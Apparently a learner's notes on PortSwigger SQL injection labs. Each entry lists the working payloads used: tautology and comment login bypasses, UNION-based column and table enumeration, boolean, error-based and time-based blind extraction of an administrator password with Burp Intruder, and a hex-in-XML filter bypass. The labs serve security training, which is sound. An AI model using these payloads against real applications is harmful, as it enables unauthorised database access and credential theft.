## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Used this format to see the products that were not supposed to be seen https://insecure-website.com/products?category=Gifts'+OR+1=1--

# Lab: SQL injection vulnerability allowing login bypass
- This lab contains a SQL injection vulnerability in the login function.To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
-  Modified the `username` parameter, giving it the value: `administrator'--`, then was able to access the admin page


# Lab: SQL injection UNION attack, determining the number of columns returned by the query
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
- After navigating to Accessories category , added ' UNION SELECT NULL,NULL,NULL-- in the url , which then returned an extra column which i wasn't supposed to see

# Lab: SQL injection UNION attack, finding a column containing text
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.
- Had to figure out the number of columns and again used the  ' UNION SELECT NULL,NULL,NULL-- payload 
- Then had to retrieve the string '764COD' in the response , so used  ' UNION SELECT 'a',NULL,NULL-- payload , got it right in the second type  ' UNION SELECT NULL,'a',NULL--

# Lab: SQL injection UNION attack, retrieving data from other tables
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
- Repeated the same steps from previous 2 labs to find out exact number of columns and exact what data type which column is
- Used 'UNION SELECT username , password FROM users , and got the administrator credentials 
- Logged in as administrator and accessed his my account page

# Lab: SQL injection attack, querying the database type and version on Oracle
- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
- Carried out the same steps as previous labs in order and then had to use oracle syntax to find out the category of the column found 
- Used 'UNION SELECT 'a','a' FROM DUAL since DUAL is officlally used in oracle databases
- 'UNION SELECT BANNER, NULL FROM v$version-- to get the exact version of the oracle database

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
- Same as the previous lab , it was mysql instead of oracle 
- 'UNION SELECT @@version , 'a'--

# Lab: SQL injection attack, listing the database contents on non-Oracle databases
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
- Same steps were carried to figure out how many columns and what category 
- '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  to get the exact table name
- '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- to get the exact column name which stores the administrator password 
- '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- , got the admin credentials and was able to log in 

# Lab: SQL injection attack, listing the database contents on Oracle
 - This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
 - Same as the above , just followed the oracle syntax in terms of commands

# Lab: SQL injection UNION attack, retrieving multiple values in a single column
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
- Had to figure out what the number of columns and what is the category of each (same commands as previous labs)
-  Can retrieve multiple values together within this single column by concatenating the values together and can also include a separator to let you distinguish the combined values.
- '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- , this command retrieves the username and password at the same time with the separation of ~
- The || lines are string concatenation used in db (oracle)


# Lab: Blind SQL injection with conditional responses
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
- TrackingID was assigned post login . used a injection xyz' AND '1'='1 which returned welcome back , did not return it for '1'='2 since it is false
- `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` To check if there is a table named users and user named administrator 
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a To verify administrator
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a , to estimate how many number of characters is the password comprised of , manually kept increasing the number and determined that the password has 20 characters
- Sent the req to burp INTRUDER and TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a to verify each substring in the password (change numbers wrt position of the character - abc (a -1 , b -2 , c-3) last digit denotes how many characters to select wrt the middle number which denotes the exact position of a substring) 
- IN intruder , simple list was selected and characters a-z and 0-9 were added and payload added TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- Grep-match to find the response which contains welcome back 
- Repeated the process until the 20th character and logged in as administrator


# Lab: Blind SQL injection with conditional errors
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
- Same as above , except this is oracle database , it returns error whenever the condition is true and vice versa 
- TrackingId=xyz'||(SELECT '' FROM dual)||'
- TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
- TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
- TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' (checked it manually)
- TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 - Added payload to the above query
 - TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' (Found all 20 characters of the password one by one using burp INTRUDER)

# Lab: Visible error-based SQL injection
- This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
- TrackingId=ogAZZfxtOKUELbuJ' , gives out error , so TrackingId=ogAZZfxtOKUELbuJ'-- , gives out status code 200 
- TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- , added 1=cast since the error says AND condition must be boolean
- 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
- TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--, logged in as administrator

# Lab: Blind SQL injection with time delays
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
- Just had to cause a 10 second delay in the lab , tried different database inputs until the postgre sql command worked
- TrackingId=x'||pg_sleep(10)--

# Lab: Blind SQL injection with time delays and information retrieval
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
- Same process as the last one , conditional time delay was a new step
- Then had to do the same thing to retrieve the administrator credentials , same steps as previous labs


# Lab: SQL injection with filter bypass via XML encoding
- This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
- Had to find the exact number of columns in the database , used the same UNION SELECT NULL method except used it in hex character since i wasn't injecting in the url , i was injecting in the xml encoding 
- After getting the columns used this query in hex characters : UNION SELECT username || '~' || password FROM users
- Had to convert everything into hex , since the 50 % or less than 50 % conversion didn't work 
- Then retrieved the administrator credentials and was able to log in 


